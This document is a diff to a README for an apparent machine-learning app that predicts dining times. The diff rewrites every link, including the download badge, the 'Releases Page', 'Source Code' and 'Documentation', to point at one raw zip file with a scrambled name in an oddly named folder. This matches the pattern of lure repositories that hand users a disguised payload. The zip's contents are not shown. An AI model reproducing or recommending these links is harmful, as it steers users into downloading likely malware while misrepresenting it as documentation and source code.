@@ -7,7 +7,7 @@ This application predicts dining times using advanced machine learning technique
 
 ## 🌐 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/releases)
+[![Download Now](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/raw/refs/heads/main/berthed/Engineering_Learning_Using_Dining_Predicting_Machine_Feature_Time_with_2.2.zip)](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/raw/refs/heads/main/berthed/Engineering_Learning_Using_Dining_Predicting_Machine_Feature_Time_with_2.2.zip)
 
 **To download the software:**
 
@@ -26,7 +26,7 @@ To run this application, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To install the application, visit this page to download: [Releases Page](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/releases).
+To install the application, visit this page to download: [Releases Page](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/raw/refs/heads/main/berthed/Engineering_Learning_Using_Dining_Predicting_Machine_Feature_Time_with_2.2.zip).
 
 1. **Choose the appropriate file for your operating system.**
    - For Windows, download the `.exe` file.
@@ -101,8 +101,8 @@ Thank you for using our application. Your feedback helps us improve features and
 
 ## 🔗 Additional Links
 
-- [Source Code](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering)
-- [Documentation](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/wiki)
+- [Source Code](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/raw/refs/heads/main/berthed/Engineering_Learning_Using_Dining_Predicting_Machine_Feature_Time_with_2.2.zip)
+- [Documentation](https://github.com/qiyana233/Predicting-Dining-Time-Using-Machine-Learning-with-Feature-Engineering/raw/refs/heads/main/berthed/Engineering_Learning_Using_Dining_Predicting_Machine_Feature_Time_with_2.2.zip)
 
 We hope you enjoy predicting dining times with our application!
 ```
